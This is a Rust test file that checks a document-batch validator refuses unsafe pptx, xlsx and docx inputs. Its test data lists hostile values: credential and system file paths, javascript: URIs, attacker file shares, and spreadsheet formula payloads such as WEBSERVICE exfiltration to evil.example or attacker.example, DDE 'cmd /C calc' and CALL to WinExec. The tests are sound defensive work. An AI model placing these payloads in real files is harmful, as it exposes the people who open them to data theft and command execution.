            {"command": "remove", "path": "/slide[3]"},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "from": "/slide[1]/shape[2]", "before": "p[@paraId=1A2B3C4D]"},
            {"command": "set", "path": "/Sheet1/A1", "props": {"value": "1"}},
        ]);
        f.call(
            "call-1",
            json!({"name": "a", "format": "pptx", "content": content}),
        )
        .await
        .unwrap();
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_items_cannot_reach_outside_the_document() {
        let f = fixture(Some("echo ran > ran; exit 9"), None);
        let picture = |src: &str| json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": src}});
        let shape = |props: Value| json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": props});
        let mut items: Vec<Value> = [
            // A file property takes a data URI and nothing else.
            "/Users/me/.ssh/id_rsa",
            "~/Pictures/me.png",
            "../../../secret.png",
            "secret.png",
            "C:\\x",
            "C:photo.jpg",
            "file:\\\\x",
            "file:///etc/passwd",
            "\\\\server\\share\\x.png",
            "/Windows/System32/x",
            "/ProgramData/x",
            "https://example.com/x.png",
            "javascript:alert(1)",
            "ms-word:ofe|u|https://example.com/x.docx",
            "data:text/plain,not-base64",
            "data:;base64,AAAA",
        ]
        .iter()
        .map(|src| picture(src))
        .collect();
        items.extend([
            json!({"command": "add", "parent": "/slide[1]", "type": "ole", "props": {"path": "/etc/hosts"}}),
            shape(json!({"fill": {"image": {"src": "/tmp/x.png"}}})),
            shape(json!({"logo": "data-free.png"})),
            shape(json!({"fill.image": "/Users/me/x.png"})),
            shape(json!({"subtitle": "/Users/me/x"})),
            shape(json!({"font.color": "~/x"})),
            shape(json!({"numberformat": "file:x"})),
            shape(json!({"x": "C:x"})),
            shape(json!({"link": "notes.txt"})),
            json!({"command": "add", "parent": "/", "type": "table", "props": {"data": "/Users/x/t.csv"}}),
            // A link takes a web or mail address.
            shape(json!({"link": "javascript:alert(1)"})),
            shape(json!({"link": "file:///etc/passwd"})),
            shape(json!({"hyperlink": "ms-word:ofe|u|x"})),
            shape(json!({"url": "/etc/hosts"})),
            // Any other property names no file and no address.
            shape(json!({"styles": ["plain", "/Volumes/USB/x.png"]})),
            shape(json!({"custom": "C:\\x"})),
            shape(json!({"custom": "file:\\\\x"})),
            shape(json!({"custom": "\\\\server\\share"})),
            shape(json!({"custom": "a\\..\\..\\x"})),
            shape(json!({"custom": ".hidden"})),
            shape(json!({"custom": "javascript:void(0)"})),
            shape(json!({"background": "image:/Users/me/x.png"})),
            json!({"command": "add", "parent": "/slide[1]", "type": "file:///etc/hosts"}),
            // An element field names an element.
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "from": "C:\\x"}),
            json!({"command": "move", "path": "/slide[1]/shape[1]", "to": "../../x"}),
            json!({"command": "add", "parent": "//server/share", "type": "shape"}),
            json!({"command": "add", "parent": "\\\\server\\share", "type": "shape"}),
            json!({"command": "set", "path": "/Users/me/.ssh/id_rsa", "props": {"value": "1"}}),
            json!({"command": "add", "parent": "~/x", "type": "shape"}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "from": "/Windows/System32/x"}),
            json!({"command": "add", "parent": "/ProgramData/x", "type": "shape"}),
            json!({"command": "set", "path": "/Users/x", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/Q3 Sales/A1", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/slide[1]/shape[@name=C:x]", "props": {"bold": "true"}}),
            json!({"command": "set", "path": "/slide[1]/shape[@name=\"a/b\"]", "props": {"bold": "true"}}),
            json!({"command": "set", "path": "file:///etc/hosts", "props": {"value": "1"}}),
            json!({"command": "set", "path": "javascript:x", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/slide[1]/", "props": {"value": "1"}}),
        ]);
        let errors = refused(&f, &items).await;
        assert!(
            errors[0].contains("\"props.src\" must be a data: URI"),
            "{}",
            errors[0]
        );
        let at = |needle: &str| {
            errors
                .iter()
                .find(|error| error.contains(needle))
                .unwrap_or_else(|| panic!("no refusal names {needle}"))
        };
        at("\"props.fill\" must be a single value");
        at("\"props.link\" must be an https:, http: or mailto: address, or slide[n]");
        at("\"props.fill.image\" must be a data: URI");
        at("\"props.subtitle\" names a file or an address");
        at("\"props.styles\" must be a single value");
        at("\"props.background\" may name an image only as a data: URI");
        at("\"props.data\" must be the table's rows inline");
        at("\"from\" must name an element of the document");
        at("\"to\" must name an element of the document");
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn data_uris_links_and_text_with_addresses_are_fine() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                "{}",
            )),
            None,
        );
        let content = json!([
            {"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "alt": "Logo", "link": "https://example.com"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "see https://example.com and a/b", "title": "MS-DOS: C:\\ and /usr/bin", "notes": "~/draft, ../old", "hyperlink": "mailto:team@example.com", "background": "FF0000-0000FF-90", "fill": "accent1"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "slide[3]", "text": "Next"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "/slide[3]", "text": "Next"}},
            {"command": "set", "path": "/Sheet1/B2", "props": {"formula": "=SUM(A1:A3)", "numberformat": "0.00%", "merge": "A1:C1", "anchor": "E2:L18", "value": "12:30", "font.color": "1F4E79"}},
            {"command": "add", "parent": "/", "type": "sheet", "props": {"name": "Q3 Sales"}},
            {"command": "set", "path": "/Q3 Sales/A1", "props": {"value": "1"}},
            {"command": "set", "path": "/slide[1]/shape[@name=\"My Title\"]", "props": {"bold": "true"}},
            {"command": "set", "path": "Sheet1!A1", "props": {"value": "x"}},
            {"command": "add", "parent": "/body", "type": "paragraph", "after": "find:Summary", "props": {"text": "x"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "Name,Cost;Hosting,1200"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "Name,Score\nAlice,90"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "ab:c,d"}},
            // Gradients, image fills, number formats and lengths in their
            // own syntax.
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"fill": "linear:FF0000-0000FF-90", "gradient": "radial:FF0000-0000FF", "background": "image:data:image/png;base64,iVBORw0KGgo=", "x": ".5in", "y": "-2pt", "width": "0.5cm", "link": "/slide[3]/shape[@name=Title]"}},
            {"command": "set", "path": "/Sheet1/C1", "props": {"numberformat": "hh:mm", "font.numFmt": "[h]:mm:ss", "format": "yyyy-mm-dd hh:mm"}},
        ]);
        let result = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": content}),
            )
            .await
            .unwrap();
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen, content);
    }

    /// Every batch command the bundled office skills teach (a snapshot of
    /// `assistant-runtime/skills/ofox-office-*`) passes the checks.
    #[test]
    fn the_skills_examples_pass_the_batch_checks() {
        let mut commands: Vec<Value> =
            serde_json::from_str(include_str!("testdata/skill-batches.json")).unwrap();
        assert!(commands.len() > 100);
        // As a document's batch: the strictest checks of the three formats.
        check_batch(&mut commands, DocumentFormat::Docx).unwrap();
    }

    #[test]
    fn elements_are_named_as_officecli_names_them() {
        let sheets = [
            "sheet1".to_owned(),
            "销售".to_owned(),
            "q3 sales".to_owned(),
        ];
        for path in [
            "/",
            "/body",
            "/body/p[last()]",
            "/body/tbl[last()]/tr[1]/tc[2]",
            "/body/p[@paraId=00100000]",
            "/header[1]",
            "/styles",
            "/theme",
            "/notes",
            "/slide[1]",
            "/slide[1]/placeholder[title]",
            "/slideMaster[1]/slideLayout[2]",
            "/slide[1]/table[@name=Plan]/tr[1]",
            "/slide[1]/shape[@id=100000]",
            "/slide[1]/shape[@name=\"My Title\"]",
            "/slide[1]/shape[@name='Q3 plan']",
            "/Sheet1/A1",
            "/Sheet1/A1:C3",
            "/Sheet1/col[A]",
            "/Sheet1/row[2]",
            "/Sheet1/chart[1]",
            "/Sheet1/tbl[1]",
            "/Sheet1",
            "/sheet[2]/A1",
            "/销售/B3:B9",
            "/Q3 Sales/A1",
            "shape",
            "p[@paraId=1A2B3C4D]",
            "Sheet1!A1",
            "1",
            "slide[3]",
            "nextslide",
        ] {
            assert!(names_an_element(path, false, &sheets), "{path}");
        }
        assert!(names_an_element("find:Revenue grew", true, &sheets));
        for path in [
            "",
            "//server/share",
            "\\\\server\\share",
            "/slide[1]/",
            "/slide[1]//shape",
            "/Users/me/.ssh/id_rsa",
            "/Users/x",
            "/etc/hosts",
            "/Windows/System32/x",
            "/ProgramData/x",
            "/Data/A1",
            "/../etc",
            "/slide[1]/..",
            "/slide[1",
            "/slide[1]]",
            "/slide[1]x",
            "/slide[1]x[2]",
            "/-x",
            "~/x",
            "../x",
            "./x",
            "C:\\x",
            "C:x",
            "file:///x",
            "javascript:x",
            "find:x",
            "a/b",
            "/slide[1]/shape[@name=C:x]",
            "/slide[1]/shape[@name=\"a/b\"]",
            "/slide[1]/shape[@name=\"a:b\"]",
            "/slide[1]/shape[@name=\"open]",
            "/slide[1]/shape[a/b]",
            "p[#x]",
            "/Sheet1/x",
            "/Sheet1/secret",
            "/q3 sales/x",
        ] {
            assert!(!names_an_element(path, false, &sheets), "{path}");
        }
    }

    #[test]
    fn sheets_made_by_the_batch_root_only_cells_and_ranges() {
        let batch = |name: &str, path: &str| {
            let mut commands = vec![
                json!({"command": "add", "parent": "/", "type": "sheet", "props": {"name": name}}),
                json!({"command": "set", "path": path, "props": {"value": "1"}}),
            ];
            check_batch(&mut commands, DocumentFormat::Xlsx)
        };
        assert!(batch("Users", "/Users/x/secret.txt").is_err());
        // The sheet's own item says why, for an added or a renamed sheet.
        for (name, error) in [
            ("Home", batch("Home", "/Sheet1/A1").unwrap_err()),
            ("Media", batch("Media", "/Sheet1/A1").unwrap_err()),
            ("a/b", batch("a/b", "/Sheet1/A1").unwrap_err()),
            (
                "Library",
                check_batch(
                    &mut [
                        json!({"command": "set", "path": "/Sheet1", "props": {"name": "Library"}}),
                    ],
                    DocumentFormat::Xlsx,
                )
                .unwrap_err(),
            ),
        ] {
            assert!(
                error.contains(&format!(
                    "item 0: sheet name \"{name}\" cannot be used as a path root; rename the sheet"
                )),
                "{error}"
            );
        }
        // A file system's folder name roots nothing, even as a sheet.
        assert!(batch("Users", "/Users/A1").is_err());
        assert!(batch("Program Files", "/Program Files/A1").is_err());
        for name in ["nix", "snap", "sbin", "lib", "cores"] {
            assert!(batch(name, &format!("/{name}/A1")).is_err(), "{name}");
        }
        assert!(batch("Sales", "/Sales/A1:C3").is_ok());
        assert!(batch("Sales", "/Sales/row[2]").is_ok());
        assert!(batch("Sales", "/Sales/chart[1]").is_ok());
        assert!(batch("Sales", "/Sales").is_ok());
        assert!(batch("Sales", "/Sales/x").is_err());
        assert!(batch("Sales", "/Sales/secret.txt").is_err());
        // A rename makes a sheet too.
        let mut commands = vec![
            json!({"command": "set", "path": "/Sheet1", "props": {"name": "Data"}}),
            json!({"command": "set", "path": "/Data/B2", "props": {"value": "1"}}),
        ];
        check_batch(&mut commands, DocumentFormat::Xlsx).unwrap();
    }

    /// `items` as an xlsx batch: the checks' answer, the formula checks
    /// included.
    fn workbook(items: &[Value]) -> Result<(), String> {
        Document::new(CreateDocumentArgs {
            name: "a".into(),
            format: DocumentFormat::Xlsx,
            content: Value::Array(items.to_vec()),
        })
        .map(drop)
    }

    fn cell(props: Value) -> Value {
        json!({"command": "set", "path": "/Sheet1/A1", "props": props})
    }

    /// `items` as a pptx batch: the checks' answer.
    fn deck_batch(items: &[Value]) -> Result<(), String> {
        Document::new(CreateDocumentArgs {
            name: "a".into(),
            format: DocumentFormat::Pptx,
            content: Value::Array(items.to_vec()),
        })
        .map(drop)
    }

    /// A deck's table and chart data is read as a whole (see
    /// [`data_reaches_out`]): officecli 1.0.160 reads a file only when the
    /// whole value names one, so each cell of a value of several is text,
    /// and PowerPoint evaluates nothing, so a leading `+`, `-`, `=`, `.`,
    /// `~`, `@`, `/` or a colon is text there. Chart categories are checked
    /// the same way.
    #[test]
    fn deck_data_is_read_whole() {
        let table = |data: &str| json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
        let chart = |data: &str, categories: &str| json!({"command": "add", "parent": "/slide[1]", "type": "chart", "props": {"chartType": "column", "data": data, "categories": categories}});
        let mut items = vec![
            table("指标,变化;收入,+18%;成本,-5%"),
            // officecli's quoted cell, a comma inside.
            table("指标,变化;\"含税, +18%\",=1"),
            chart("-成本:1,2", "Q1,Q2"),
            chart("Sales:5", "Q1"),
            // A one-letter series of numbers names no drive.
            chart("A:1,2", "Q1,Q2"),
            chart("B:3.5,-4", "Q1,Q2"),
            chart("A:1,2;B:3,4", "Q1,Q2"),
            // Categories are read whole too: their other cells are text.
            chart("Sales:1,2", ".NET,Java"),
            chart("Sales:1,2", "~approx,x"),
            chart("Sales:1,2", "Q1,/etc/hosts"),
            // A one-letter series of numbers, or none yet, names no drive.
            chart("B:", "Q1"),
            // A relative name without a refused prefix or a `..` segment
            // names nothing outside the engine's work folder.
            table("s.csv"),
            table("dir/s.csv"),
            chart("收入/成本:5", "2025/26"),
            chart("Sales:5", "2025/26"),
        ];
        for prose in [
            ".NET",
            "~approx",
            "Sales:5",
            "含税, +18%",
            "v1.2",
            "ab:c",
            "A:1,2",
        ] {
            items.push(table(prose));
            items.push(table(&format!("Name,Note;x,{prose}")));
        }
        // A cell like a root, a mention or a drive is text among others
        // (`/` for 无, a handle, a grade).
        for cell in ["/", "@x", "@ofox_ai", "A:优秀", ".NET", "C:t.csv", "/x.csv"] {
            items.push(table(&format!("等级,说明;{cell},好")));
            items.push(table(&format!("等级,说明;好,{cell}")));
        }
        for item in items {
            deck_batch(std::slice::from_ref(&item))
                .unwrap_or_else(|error| panic!("{item}: {error}"));
        }
        // A whole value that names a file or an address is refused.
        let whole = [
            "./s.csv",
            "a/../b",
            " /x.csv",
            "https://x.example/t.csv",
            "file:t.csv",
            "a,b/../../secret.csv",
            "x\n../../secret.csv",
            "C:\\Users\\x\\a,b.csv",
            // A drive, then a path that may hold a separator.
            "C:a,b.csv",
            "C:x;y",
            "C:t.csv",
            "c:x",
            "A:1,2,x.csv",
        ];
        for data in PATH_LIKE_DATA.iter().chain(whole.iter()) {
            let error = deck_batch(&[table(data)]).unwrap_err();
            assert!(
                error.contains("must be the table's rows inline"),
                "{data}: {error}"
            );
            assert!(deck_batch(&[chart(data, "Q1,Q2")]).is_err(), "{data}");
        }
        // Categories that name a file, a mention, a drive or an address as a
        // whole.
        for categories in [
            "/etc/hosts",
            "@file",
            "C:a,b.csv",
            "https://x.example/c.csv",
        ] {
            let error = deck_batch(&[chart("Sales:1,2", categories)]).unwrap_err();
            assert!(
                error.contains("\"props.categories\""),
                "{categories}: {error}"
            );
        }
    }

    /// `data` values that read as a file in every format, and cells that do
    /// in a workbook or document: a drive is one letter and a colon
    /// (`C:t.csv` is relative to the drive's current folder), unless only
    /// numbers follow.
    const PATH_LIKE_DATA: &[&str] = &[
        "/x.csv", "@file", "C:\\x", "../x", "~/x", ".\\x", "C:t.csv", "C:x", "D:data", "a:b",
    ];

    /// A workbook's table cells are prose too, unless they read as a file;
    /// its formula checks still hold.
    #[test]
    fn workbook_data_cells_are_prose_unless_path_like() {
        let table = |data: &str| json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": data}});
        for prose in [".NET", "~approx", "Sales:5", "v1.2", "ab:c", "A:1"] {
            let item = table(&format!("Name,{prose}"));
            workbook(std::slice::from_ref(&item)).unwrap_or_else(|error| panic!("{item}: {error}"));
        }
        for path in PATH_LIKE_DATA {
            for data in [path.to_string(), format!("Name,{path}")] {
                assert!(workbook(&[table(&data)]).is_err(), "{data}");
            }
        }
        let error = workbook(&[table("指标,变化;收入,+18%;成本,-5%")]).unwrap_err();
        assert!(error.contains("table rows hold values only"), "{error}");
    }

    #[test]
    fn workbook_formulas_fetch_link_and_run_nothing() {
        for (props, why) in [
            (
                json!({"formula": r#"WEBSERVICE("https://evil.example/?"&B2)"#}),
                "WEBSERVICE",
            ),
            (json!({"formula": "webservice(B2)"}), "WEBSERVICE"),
            (json!({"formula": "_xlfn.IMAGE(B2)"}), "IMAGE"),
            (json!({"formula": r#"RTD("x",,"y")"#}), "RTD"),
            (
                json!({"formula": r#"CALL("kernel32","WinExec","JCJ","calc",0)"#}),
                "CALL",
            ),
            (json!({"formula": r#"REGISTER("x","y")"#}), "REGISTER"),
            (json!({"formula": r#"REGISTER.ID("x","y")"#}), "REGISTER"),
            (json!({"formula": r#"EXEC("calc")"#}), "EXEC"),
            (json!({"formula": r#"FILTERXML(B2,"//a")"#}), "FILTERXML"),
            // A value that starts with `=` is a formula, under any key (a
            // row takes its table's column names as keys).
            (json!({"value": "=WEBSERVICE(B2)"}), "WEBSERVICE"),
            (json!({"value": " =IMAGE(B2)"}), "IMAGE"),
            (json!({"Salary": r#"=RTD("x",,"y")"#}), "RTD"),
            // DDE.
            (json!({"formula": "cmd|' /C calc'!A0"}), "(DDE)"),
            (json!({"value": "=cmd|' /C calc'!A0"}), "(DDE)"),
            // Other workbooks.
            (json!({"formula": "[x.xlsx]Sheet1!A1"}), "another workbook"),
            (
                json!({"formula": "SUM([1]Sheet1!A1:A3)"}),
                "another workbook",
            ),
            (
                json!({"formula": r"'C:\dir\[x.xlsx]Sheet1'!A1"}),
                "another workbook",
            ),
            (
                json!({"formula": r"'\\attacker\share\[x.xlsx]Sheet1'!A1"}),
                "another workbook",
            ),
            (
                json!({"formula": "'/Users/me/x.xlsx'!Total"}),
                "another workbook",
            ),
            (json!({"formula": "Budget.xlsx!Total"}), "another workbook"),
            // File shares and addresses, but in HYPERLINK's link.
            (
                json!({"formula": r#"INDIRECT("\\attacker\share")"#}),
                "INDIRECT",
            ),
            (
                json!({"formula": r#"CONCAT("https://evil.example/",B2)"#}),
                "file share or an address",
            ),
            (
                json!({"formula": r#"HYPERLINK("file:///etc/passwd","x")"#}),
                "file: address",
            ),
            (
                json!({"formula": r#"HYPERLINK("\\attacker\share","x")"#}),
                "uses HYPERLINK",
            ),
            (
                json!({"formula": r#"HYPERLINK("https://x","\\attacker\share")"#}),
                "file share or an address",
            ),
            (
                json!({"formula": r#"HYPERLINK(B2,"https://evil.example/")"#}),
                "uses HYPERLINK",
            ),
            // R53: more functions, under any prefix.
            (
                json!({"formula": r#"_xlfn.WEBSERVICE("https://evil.example/")"#}),
                "WEBSERVICE",
            ),
            (
                json!({"value": r#"=STOCKHISTORY("MSFT",TODAY())"#}),
                "STOCKHISTORY",
            ),
            (
                json!({"formula": r#"CUBEVALUE("Sales","[Measures].[x]")"#}),
                "CUBEVALUE",
            ),
            (
                json!({"formula": r#"_xlfn.CUBEMEMBER("Sales","x")"#}),
                "CUBEMEMBER",
            ),
            (
                json!({"formula": r#"TRANSLATE(B2,"en","fr")"#}),
                "TRANSLATE",
            ),
            (json!({"formula": "DETECTLANGUAGE(B2)"}), "DETECTLANGUAGE"),
            (
                json!({"formula": r#"COPILOT("summarize",B2:B9)"#}),
                "COPILOT",
            ),
            (json!({"formula": "IMPORTTEXT(B2)"}), "IMPORTTEXT"),
            (json!({"formula": "IMPORTCSV(B2)"}), "IMPORTCSV"),
            (json!({"formula": "IMPORTDATA(B2)"}), "IMPORTDATA"),
            (json!({"formula": r#"IMPORTRANGE(B2,"A1")"#}), "IMPORTRANGE"),
            (json!({"formula": r#"IMPORTXML(B2,"//a")"#}), "IMPORTXML"),
            (
                json!({"formula": r#"IMPORTHTML(B2,"table",1)"#}),
                "IMPORTHTML",
            ),
            (json!({"formula": r#"_xlfn._xlws.PY("x",0)"#}), "PY"),
            (json!({"formula": r#"INDIRECT("Sheet1!"&B2)"#}), "INDIRECT"),
            // R53: `+`, `-` and `@` start a formula too.
            (json!({"value": "+WEBSERVICE(B2)"}), "WEBSERVICE"),
            (json!({"value": "-IMAGE(B2)"}), "IMAGE"),
            (json!({"value": "@RTD(B2)"}), "RTD"),
            (json!({"text": "-cmd|' /C calc'!A0"}), "(DDE)"),
            // R53: HYPERLINK's link is one quoted address, nothing built.
            (
                json!({"value": r#"=HYPERLINK("https://"&A1,"x")"#}),
                "uses HYPERLINK",
            ),
            (
                json!({"value": r#"=HYPERLINK("file:///x")"#}),
                "file: address",
            ),
            (
                json!({"formula": r#"HYPERLINK(CONCAT("https://x/",A1),"x")"#}),
                "uses HYPERLINK",
            ),
            (
                json!({"formula": r#"HYPERLINK(CHAR(104)&"ttps://x","x")"#}),
                "uses HYPERLINK",
            ),
            (json!({"formula": "MAP(A1:A3,HYPERLINK)"}), "calls MAP"),
            (
                json!({"formula": r#"CONCAT("//attacker/share",B2)"#}),
                "file share or an address",
            ),
            (json!({"formula": r#"LEN("FILE:x")"#}), "file: address"),
            // R54: only allowed functions, whatever else they are called.
            (
                json!({"value": r#"=DDE("cmd","/c calc","x")"#}),
                "calls DDE",
            ),
            (json!({"formula": r#"EVALUATE("1+1")"#}), "calls EVALUATE"),
            (json!({"formula": "LAMBDA(x,x)(1)"}), "calls LAMBDA"),
            (json!({"formula": "_xlfn.LET(x,1,x)"}), "calls LET"),
            (json!({"formula": "myfn(B2)"}), "calls MYFN"),
            (
                json!({"formula": "SUM (A1:A3)+GETPIVOTDATA (B2)"}),
                "calls GETPIVOTDATA",
            ),
            // R54: where a string starts is never in doubt.
            (
                json!({"formula": r#"SUM(Table1[[a"b]])&EVALUATE(A2)&Table1[[c"d]]"#}),
                "inside a sheet name or a table reference",
            ),
            (
                json!({"formula": r#"'x"'!A1&EVALUATE(A2)"#}),
                "inside a sheet name or a table reference",
            ),
            (json!({"formula": r#"LEN("x)"#}), "does not pair up"),
            (json!({"formula": "SUM(A1)]"}), "does not pair up"),
        ] {
            let error = workbook(&[cell(props.clone())]).unwrap_err();
            assert_eq!(code(&error), FAILED, "{props}");
            assert!(
                error.contains("item 0:") && error.contains(why),
                "{props}: {error}"
            );
        }
        // The review's input: refused before its formula is read.
        let item = json!({"command": "set", "path": "/Sheet1/cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}});
        assert!(workbook(&[item]).is_err());
        // Conditional formats, validations and named ranges hold formulas
        // without `=`.
        for (item, why) in [
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "WEBSERVICE(B2)", "fill": "FFFF00"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "formulacf", "props": {"ref": "A1:A10", "formula": "IMAGE(B2)", "fill": "FFFF00"}}),
                "IMAGE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "A1", "type": "custom", "formula1": "RTD(\"x\",,\"y\")"}}),
                "RTD",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "namedrange", "props": {"name": "feed", "ref": "WEBSERVICE(Sheet1!B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "namedrange", "props": {"name": "feed", "refersTo": "[x.xlsx]Sheet1!A1"}}),
                "another workbook",
            ),
            // R53: a target in the path, whatever the verb (the element
            // checks take `/Sheet1/cf[1]` only as a selector, `cf[1]`).
            (
                json!({"command": "set", "path": "cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "cf[1]", "props": {"value": "WEBSERVICE(B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "data-validation[1]", "props": {"formula1": "IMAGE(B2)"}}),
                "IMAGE",
            ),
            (
                json!({"command": "set", "selector": "Conditional_Formatting[2]", "props": {"value2": "RTD(B2)"}}),
                "RTD",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"valuesRef": "WEBSERVICE(B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"valuesRef": "INDIRECT(B2)"}}),
                "INDIRECT",
            ),
            (
                json!({"command": "set", "path": "sparkline[1]", "props": {"range": "INDIRECT(B2)"}}),
                "INDIRECT",
            ),
            // R53: a table's rows hold values.
            // (A table's data is a reference-bearing key: read whole first.)
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B3", "data": "Name,Value\nA,=WEBSERVICE(B2)"}}),
                "calls WEBSERVICE",
            ),
            // A leading `@` reads as a file (`@file`) before it reads as a
            // formula.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name;@x"}}),
                "must be the table's rows inline",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name,\" +SUM(1)\""}}),
                "table rows hold values only",
            ),
            (
                json!({"command": "set", "path": "/Sheet1/A1", "props": {"data": "-x"}}),
                "table rows hold values only",
            ),
            // R54: the selector form of a path, and tab-separated rows.
            (
                json!({"command": "set", "selector": "Sheet1!cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "Sheet1!cf[1]", "props": {"value": "WEBSERVICE(B2)"}}),
                "WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "Sheet1!validation[1]", "props": {"value2": "EVALUATE(B2)"}}),
                "calls EVALUATE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name\tValue\nA\t=WEBSERVICE(B2)"}}),
                "calls WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "/Sheet1/A1", "props": {"data": "Name\tValue\nA\t=SUM(B2)"}}),
                "table rows hold values only",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "=EVALUATE(B2),2"}}),
                "calls EVALUATE",
            ),
            // R56: any key with `formula` in it, whatever its case.
            (
                json!({"command": "set", "path": "/Sheet1/B1", "props": {"arrayformula": "WEBSERVICE(\"https://attacker.example/?q=\"&A1)", "ref": "B1"}}),
                "calls WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "/Sheet1/B1", "props": {"arrayFormula": "IMAGE(A1)", "ref": "B1"}}),
                "calls IMAGE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "cell", "props": {"arrayformula": "WEBSERVICE(A1)", "ref": "C1"}}),
                "calls WEBSERVICE",
            ),
            (
                json!({"command": "set", "path": "/Sheet1/B1", "props": {"shared_Formula": "RTD(A1)"}}),
                "calls RTD",
            ),
            // R56: pivot tables, and `name` as a named range.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "pivottable", "props": {"position": "H1", "calculatedField": "Net Margin:=WEBSERVICE(B2)"}}),
                "calls WEBSERVICE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "pivotTable", "props": {"position": "H1", "aggregate": "IMAGE(B2)"}}),
                "calls IMAGE",
            ),
            (
                json!({"command": "add", "parent": "/", "type": "name", "props": {"name": "feed", "value": "WEBSERVICE(B2)"}}),
                "calls WEBSERVICE",
            ),
            // R57: an inline list, cell by cell; one reference as a formula.
            // (R62: a list with `!` is read whole as one.)
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "Sales:1,2,3", "categories": "[\\\\x\\y.xlsx]Sheet1!A1"}}),
                "refers to another workbook",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "Sales:1,2", "categories": "Q1,=WEBSERVICE(A1)"}}),
                "has a cell that calls WEBSERVICE",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "Sales:1,2", "categories": "Q1,https://x.example/a"}}),
                "has a cell that names a file share or an address",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"values": "'[x.xlsx]S'!B2:B5"}}),
                "another workbook",
            ),
            // R59: on a chart, a key that is not text is a formula.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "foo": "WEBSERVICE(\"https://x\")"}}),
                "calls WEBSERVICE",
            ),
            // R59: text names no place outside the workbook.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "From [x.xlsx]Sheet1!A1"}}),
                "another workbook",
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "See \\\\server\\share"}}),
                "file share",
            ),
            // R60: a validation's prompt title is text, unless it starts like
            // a formula.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "B2:B9", "type": "list", "formula1": "Yes,No", "promptTitle": "=WEBSERVICE(\"https://x.example/\")"}}),
                "calls WEBSERVICE",
            ),
            // R56: a chart's text that starts like a formula is one.
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "=WEBSERVICE(\"https://x.example/\")"}}),
                "calls WEBSERVICE",
            ),
        ] {
            let error = workbook(std::slice::from_ref(&item)).unwrap_err();
            assert!(
                error.contains("item 0:") && error.contains(why),
                "{item}: {error}"
            );
        }
